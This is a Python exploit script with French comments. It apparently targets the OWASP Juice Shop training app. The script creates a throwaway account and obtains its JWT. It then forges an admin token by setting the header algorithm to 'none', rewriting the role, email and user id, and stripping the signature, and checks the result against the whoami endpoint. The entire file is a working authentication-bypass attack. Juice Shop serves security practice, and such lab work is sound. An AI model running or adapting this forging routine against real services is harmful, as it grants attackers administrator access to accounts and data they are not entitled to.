import base64
import json
import logging
import time

import requests


class ForgedJWT:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.endpoints = {
            "login": "/rest/user/login",
            "whoami": "/rest/user/whoami"
        }

    def create_account(self):
        data = {
            "email": f"test{time.time()}@test.com",
            "password": "test123"
        }
        try:
            response = self.session.post(f"{self.base_url}/api/Users", json=data)
            return data if response.status_code == 201 else None
        except:
            return None

    def get_current_jwt(self):
        credentials = self.create_account()
        if not credentials:
            return None
        try:
            response = self.session.post(
                f"{self.base_url}{self.endpoints['login']}",
                json=credentials
            )
            if response.status_code == 200:
                try:
                    return response.json()["authentication"]["token"]  # Ajout du try ici
                except (ValueError, KeyError):
                    logging.error("Failed to parse JWT response.")
            return None
        except Exception as e:
            logging.error(f"JWT error: {str(e)}")
            return None


    def forge_admin_jwt(self, original_jwt):
        try:
            parts = original_jwt.split('.')
            if len(parts) != 3:
                logging.error("Invalid JWT format.")
                return None

            # Décodage de l'en-tête et du payload
            header = json.loads(base64.b64decode(parts[0] + "=" * (-len(parts[0]) % 4)))
            payload = json.loads(base64.b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))

            # Modification pour bypasser la signature
            header["alg"] = "none"

            # Modification des droits
            payload["role"] = "admin"
            payload["email"] = "admin@juice-sh.op"
            payload["id"] = 1  # L'ID admin est souvent 1 dans Juice Shop

            # Reconstruction du JWT forgé
            new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
            new_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')

            forged_jwt = f"{new_header}.{new_payload}."
            logging.debug(f"Forged JWT: {forged_jwt}")
            return forged_jwt
        except Exception as e:
            logging.error(f"Error forging JWT: {e}")
            return None



    def verify_admin_access(self, jwt):
        headers = {"Authorization": f"Bearer {jwt}"}
        try:
            response = self.session.get(
                f"{self.base_url}{self.endpoints['whoami']}",
                headers=headers
            )
            logging.debug(f"WhoAmI Response: {response.text}")
            if response.status_code == 200:
                data = response.json()
                return data.get("user", {}).get("role") == "admin"
            else:
                logging.error(f"Access verification failed. Status: {response.status_code}")
            return False
        except Exception as e:
            logging.error(f"Error verifying admin access: {e}")
            return False


    def run_attack(self):
        original_jwt = self.get_current_jwt()
        if not original_jwt:
            return {"status": "failed", "details": "Impossible d'obtenir un JWT"}

        forged_jwt = self.forge_admin_jwt(original_jwt)
        if not forged_jwt:
            return {"status": "failed", "details": "Échec du forgeage"}

        if self.verify_admin_access(forged_jwt):
            return {
                "status": "success",
                "details": {"jwt": forged_jwt}
            }

        return {"status": "failed", "details": "Vérification échouée"}